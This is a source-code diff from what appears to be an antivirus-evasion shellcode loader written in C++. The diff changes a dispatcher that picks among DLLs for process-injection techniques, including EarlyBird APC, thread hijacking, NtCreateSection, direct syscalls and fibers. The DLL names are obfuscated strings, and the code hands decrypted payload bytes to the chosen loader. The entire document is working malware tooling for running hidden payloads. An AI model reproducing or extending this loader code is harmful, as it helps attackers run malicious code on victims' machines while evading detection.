@@ -239,68 +239,68 @@ dllAndFunction Launch::getDllNameAndFuncName(const string &function_mode) {
     switch (intFunctionMode) {
         case 1: {
             dName = R"(}&JW>,+Y?*J=?a^I_K}Q?!`|)"; // DirectlyLoader
-            funcName = R"(}&JW>,+Y?*J=?a^I>.(`)";
+            funcName = "?function1@MasterEncoderForDirectlyLoader@@SAXPEBEAEB_K@Z";
             break;
         }
         case 2: {
-            dName = R"({.@H;,dO>,+Y:&hF>#dI?&U`)"; // DirectlyLoader
-            funcName = R"({.@H:&hF>&"W)";
+            dName = R"({.@H;,dO>,+Y:&hF>#dI?&U`)"; // apcLoader
+            funcName = "?function1@MasterEncoderForApcLoader@@SAXPEBEAEB_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z";
             break;
         }
         case 3: {
-            dName = R"({b)J<.}J"&FW>,^Y'&hT?^BF/.}=?a^I_K}Q?!`|)"; // DirectlyLoader
-            funcName = R"({b)J<.}J"&FW>,^Y'&hT?^BF/.}=?a^I>.(`)";
+            dName = R"({b)J<.}J"&FW>,^Y'&hT?^BF/.}=?a^I_K}Q?!`|)"; // CreateThreatPoolWaitLoader
+            funcName = "?function1@MasterEncoderForCreateThreatPoolWaitLoader@@SAXPEBEAEB_K@Z";
             break;
         }
         case 4: {
-            dName = R"(}*JS<,ZN<YVT<,{S>&VQ)";
-            funcName = R"(}*JS<,ZN<YVT<,}JAE`|)";
+            dName = R"(}*JS<,ZN<YVT<,{S>&VQ)"; // DynamicLoader
+            funcName = "?function1@MasterEncoderForDynamicLoader@@SAXPEBEAEB_K@Z";
             break;
         }
         case 5: {
-            dName = R"(}*JS<,ZN<YVT<,}{?*"X_K}Q?!`|)";
-            funcName = R"(}*JS<,ZN<YVT<,}{?*"X)";
+            dName = R"(}*JS<,ZN<YVT<,}{?*"X_K}Q?!`|)"; // DynamicLoadPlus.dll
+            funcName = "?function1@MasterEncoderForDynamicLoadPlus@@SAXPEBEAEB_K@Z";
             break;
         }
         case 6: {
-            dName = R"(},^W?*J#/.)I{"@$.YJS/K"Y<YVT<,{S>&VQ)";
-            funcName = R"(},^W?*J#/.)I{"@$.YJS/K"Y<YVT<,{`)";
+            dName = R"(},^W?*J#/.)I{"@$.YJS/K"Y<YVT<,{S>&VQ)";// EarlyBirdAPC_InjetcLoad.dll
+            funcName = "?function1@MasterEncoderForEarlyBirdAPC_InjetcLoad@@SAXPEBEAEB_K@Z";
             break;
         }
         case 7: {
-            dName = R"(}KJG>.)=?a^I_K}Q?!`|)";
-            funcName = R"(}KJG>.)=?a^I)";
+            dName = R"(}KJG>.)=?a^I_K}Q?!`|)"; // fiberLoad
+            funcName = "?function1@MasterEncoderForFiberLoad@@SAXPEBEAEB_K@Z";
             break;
         }
         case 8: {
-            dName = R"(:L}$AK"FB&":>,+Y/,hS:&hF>#dI?&U`)";
-            funcName = R"(:L}$AK"FB&":>,+Y/,hS:&hF>!`|)";
+            dName = R"(:L}$AK"FB&":>,+Y/,hS:&hF>#dI?&U`)"; // ntCreateSectionLoad
+            funcName = "?function1@MasterEncoderForNtCreateSectionLoad@@SAXPEBEAEB_K@Z";
             break;
         }
         case 9: {
-            dName = R"(:L}'>.+Y{,VJAL}=?a^I_K}Q?!`|)";
-            funcName = R"(:L}'>.+Y{,VJAL}=?a^I)";
+            dName = R"(:L}'>.+Y{,VJAL}=?a^I_K}Q?!`|)"; // ntTestAlertLoad
+            funcName = "?function1@MasterEncoderForNtTestAlertLoad@@SAXPEBEAEB_K@Z";
             break;
         }
         case 10: {
-            dName = R"(:Y"{;&JN/K^H/Zh)?KNJ<b}=?a^I_K}Q?!`|)";
-            funcName = R"(:Y"{;&JN/K^H/YJS/K"HB%VT<,{`)";
+            dName = R"(:Y"{;&JN/K^H/Zh)?KNJ<b}=?a^I_K}Q?!`|)"; // OEPHiijack_InjectLoad
+            funcName = "?function1@MasterEncoderForOEPHiijackInjectLoad@@SAXPEBEAEB_K@Z";
             break;
 
         }
         case 11: {
-            dName = R"('Y"(}.FH>.@Y:&hF>#dI?&U`)";
-            funcName = R"('Y"(}.FH>.@Y:&hF>!`|)";
+            dName = R"('Y"(}.FH>.@Y:&hF>#dI?&U`)"; // SEHExceptLoad
+            funcName = "?function1@MasterEncoderForSEHExceptLoad@@SAXPEBEAEB_K@Z";
             break;
         }
         case 12: {
-            dName = R"('bJX<a^Q?%VT<,{S>&VQ)";
-            funcName = R"('bJX<a^Q?%VT<,{`)";
+            dName = R"('bJX<a^Q?%VT<,{S>&VQ)"; // syscallLoad
+            funcName = "?function1@MasterEncoderForSyscallLoad@@SAXPEBEAEB_K@Z";
             break;
         }
         case 13: {
             dName = R"("&FW>,^I;&JN/K^H/Zh)?KNJ<b}=?a^I_K}Q?!`|)";
-            funcName = R"("&FW>,^I;&JN/K^H/Zh)?KNJ<b}=?a^I)";
+            funcName = "?function1@MasterEncoderForThreadHiijack_InjectLoad@@SAXPEBEAEB_K@Z";
             break;
         }
         default: {
@@ -308,9 +308,7 @@ dllAndFunction Launch::getDllNameAndFuncName(const string &function_mode) {
             funcName = R"(}&JW>,+Y?*J=?a^I>.(`)";
         }
     }
-    fullFuncName = augustEncryption::decode(baseFuncNamePart1) +
-                   augustEncryption::decode(funcName) +
-                   augustEncryption::decode(baseFuncNamePart2);
+    fullFuncName=funcName;
     return {augustEncryption::decode(dName), fullFuncName};
 }
 
@@ -323,10 +321,6 @@ std::string Launch::strXor(const string &data) {
 }
 
 void Launch::launchFunction(std::string function_mode, const unsigned char *decryptedData, size_t &byteLength) {
-    auto dllAndFuncName = this->getDllNameAndFuncName(function_mode);
-    auto dllName = dllAndFuncName.first;
-    auto funcName = dllAndFuncName.second;
-    auto baseName{"../lib/"};
     if (function_mode == "14") {
         Confusion::generateAndSortArray();
         this->printMode("Function 14");
@@ -338,6 +332,10 @@ void Launch::launchFunction(std::string function_mode, const unsigned char *decr
             std::cout << "Function 14 in while_true" << std::endl;
         }
     } else {
+        auto dllAndFuncName = this->getDllNameAndFuncName(function_mode);
+        auto dllName = dllAndFuncName.first;
+        auto funcName = dllAndFuncName.second;
+        auto baseName{"../lib/"};
         loadLibrary::runFuncFromDll(baseName+dllName, funcName, decryptedData, byteLength);
     }
 }
